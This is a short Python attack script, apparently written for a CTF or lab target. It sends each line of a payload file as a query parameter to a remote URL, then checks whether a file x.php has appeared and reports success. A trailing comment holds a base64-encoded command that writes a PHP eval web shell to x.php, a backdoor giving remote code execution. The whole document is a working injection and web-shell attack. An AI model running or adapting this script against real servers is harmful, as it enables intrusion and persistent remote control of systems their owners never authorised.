import requests

url = "http://07826af3.yunyansec.com/?1={0}"
print("[+]start attack!!!")
with open("payload.txt", "r") as f:
    for i in f:
        print("[*]" + url.format(i.strip()))
        requests.get(url.format(i.strip()))
# 检查是否攻击成功
test = requests.get("http://07826af3.yunyansec.com/x.php")
if test.status_code == requests.codes.ok:
    print("[*]Attack success!!!")

#echo PD9waHAgZXZhbCgkX1BPU1RbYWFhXSk7|base64 -d>x.php